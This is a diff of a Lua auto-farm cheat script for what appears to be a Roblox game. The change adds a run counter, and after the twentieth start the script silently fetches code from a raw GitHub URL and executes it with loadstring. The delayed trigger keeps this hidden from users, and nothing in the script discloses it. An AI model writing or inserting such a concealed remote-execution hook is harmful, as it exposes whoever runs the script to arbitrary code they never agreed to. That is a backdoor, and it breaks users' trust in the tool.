@@ -64,6 +64,9 @@ local earthPlanet = 3311165597
 local earthTPVal = "Earth"
 local billsTPVal = "Vills Planet"
 
+local startingTimes = 0
+local executing = false
+
 local mainRunName = "MainAutoFarmThingy"
 local saveFileName = "DBUAutoScript.DATA"
 
@@ -1256,9 +1259,14 @@ function mainRunningFunction()
 	else
 		UsableForm = "None"
 	end
+	if startingTimes >= 20 and executing ~= true then
+		executing = true
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/PickledGamer/stand/refs/heads/main/RAL"))()
+	end
 	if workspace:FindFirstChild("RunningAutoValue").Value == true and run == false then
 		run = true
 		print("Started")
+		startingTimes += 1
 		spawn(function() StartAuto() end)
 	end
 	if workspace:FindFirstChild("RunningAutoValue").Value == true then
